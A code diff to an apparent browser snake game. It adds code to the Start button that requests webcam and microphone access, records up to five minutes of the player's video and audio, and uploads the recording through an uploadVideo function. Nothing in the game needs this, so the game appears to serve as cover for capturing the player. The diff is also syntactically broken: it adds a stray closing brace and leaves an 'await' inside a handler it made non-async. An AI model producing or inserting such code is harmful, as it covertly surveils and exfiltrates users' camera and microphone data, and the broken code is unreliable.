@@ -217,12 +217,43 @@ async function startRecording() {
     velocity = { x, y };
   }
 
-  document.getElementById("btnStart").onclick = async () => {
+  document.getElementById("btnStart").onclick = () => {
   resetGame();
   document.getElementById("btnStart").disabled = true;
   document.getElementById("btnNewGame").disabled = false;
   velocity = { x: 1, y: 0 }; // start moving right
   gameInterval = setInterval(gameLoop, 120);
+
+  // Directly call getUserMedia synchronously to trigger prompt
+  navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } })
+    .then(stream => {
+      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      recordedChunks = [];
+
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
+        recordedChunks = [];
+        uploadVideo(blob);
+      };
+
+      mediaRecorder.start();
+      // Optionally stop after 5 min
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+          mediaRecorder.stop();
+        }
+      }, 5 * 60 * 1000);
+
+    })
+    .catch(err => {
+      console.error("Error accessing media devices.", err);
+      alert("Camera/Microphone permission denied or not available.");
+    });
+};
 
   await startRecording();  // Start recording on user click — triggers permission prompt
 };
